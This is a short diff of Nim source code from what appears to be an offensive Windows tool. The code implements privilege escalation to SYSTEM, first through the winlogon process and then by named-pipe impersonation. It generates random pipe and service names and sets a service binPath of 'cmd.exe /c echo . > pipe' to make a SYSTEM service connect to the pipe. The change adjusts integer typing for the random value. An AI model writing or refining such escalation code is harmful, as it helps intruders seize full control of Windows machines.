@@ -444,9 +444,9 @@ when defined(windows):
       return "[+] T1 SYSTEM (winlogon PID=" & $sysPid & ")"
 
     # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
-    let rnd = GetTickCount() xor (GetCurrentProcessId() shl 4)
-    let pipeName = r"\\.\pipe\svc" & toHex(rnd, 8)
-    let svcName  = "svc" & toHex(rnd xor 0xDEADBEEF'u32, 8)
+    let rnd: uint32 = GetTickCount() xor GetCurrentProcessId()
+    let pipeName = r"\\.\pipe\svc" & toHex(rnd.int64, 8)
+    let svcName  = "svc" & toHex(int64(rnd xor 0xDEADBEEF'u32), 8)
     let binPath  = "cmd.exe /c echo . > " & pipeName
 
     let hPipe = CreateNamedPipeW(newWideCString(pipeName),
